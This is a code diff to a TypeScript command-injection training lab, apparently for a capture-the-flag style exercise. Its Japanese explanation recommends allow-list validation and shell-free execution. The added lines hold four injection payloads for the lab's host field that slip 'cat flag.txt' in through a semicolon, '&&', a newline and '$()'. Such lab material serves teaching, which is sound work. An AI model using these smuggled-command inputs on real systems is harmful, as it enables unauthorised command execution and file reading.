@@ -203,4 +203,10 @@ export const cmdiLab: Lab = {
 根本対策は Lv5 です。入力を許可リストで厳格に検証したうえで、シェルを介さず引数配列で外部コマンドを実行します（例: Node の \`execFile\`、Python の \`subprocess.run([...], shell=False)\`）。シェルを使わなければ、メタ文字は単なる文字列として扱われ、注入は成立しません。`,
   levels,
   run,
+  exploits: {
+    1: { host: "8.8.8.8; cat flag.txt" },
+    2: { host: "8.8.8.8 && cat flag.txt" },
+    3: { host: "8.8.8.8\ncat flag.txt" },
+    4: { host: "8.8.8.8 $(cat flag.txt)" },
+  },
 };
